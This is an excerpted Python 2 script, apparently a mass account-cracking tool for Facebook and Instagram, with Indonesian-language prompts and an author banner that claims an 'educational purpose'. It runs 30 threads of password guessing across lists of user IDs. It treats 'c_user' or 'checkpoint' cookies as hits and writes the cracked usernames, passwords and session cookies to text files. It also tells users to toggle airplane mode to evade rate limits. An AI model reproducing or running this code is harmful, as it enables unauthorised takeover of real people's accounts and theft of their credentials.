...
"""%s
 ...
 - author      : Dino 
 - facebook    : facebook.com/shahdinobaloch15
 - Whatsapp     : +923175889358
 - github      : github.com/Dino king
 - version     : 1.1
...
def banner():
 ...
 \n\033[0m----------------------------------
 \033[1;90mAuthor \033[1;97m:  Shah Dino
 \033[1;90mFacebook \033[1;97m: SHAHDINOBALOCH15
\033[1;90m WatsApp \033[1;97m: +9231175889358
 \033[1;90mDisclaimer\033[1;97m:Its For Educational Purpose
  \033[0m----------------------------------
 """)
...
class ngentod:
    ...
    def langsung(self):
        ...
        if suuu == '':
            ...
            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s Dino/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %s Dino/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
        ...
        for pw in zona:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                try:
                    ...
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('hassan/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                ...
                print '\r %s*--> %s ◊ %s            ' % (K,user,pw)
                cp.append("%s ◊ %s"% (user,pw))
                open('hassan/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
    ...
    def mobil(self, user, zona):
        ...
        for pw in zona:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,kuki)
                ok.append("%s ◊ %s ◊ %s"% (user,pw,kuki))
                open('Dino/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    ...
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('Dino/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                ...
                print '\r %s*--> %s ◊ %s              ' % (K,user,pw)
                cp.append("%s ◊ %s"% (user,pw))
                open('Dino/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
...
def menu():
    ...
    if unik == '':
    	...
    	print "\n%s [01] Dino crack akun facebook "%(P)
        print "%s [02] Dino crack akun instagram "%(P)
        c = raw_input('\n%s [?] Menu : %s'%(P,K))
    	hasill(c)
    elif unik in['8','08']:
        os.system("xdg-open " )
...
def hasill(c):
	if c in[""]:
		...
		if rom in['1','01']:
			...
			exit()
def igg():
	print ("\n%s [%s!%s] Cth nama %s: %shassan "%(P,M,P,M,K))
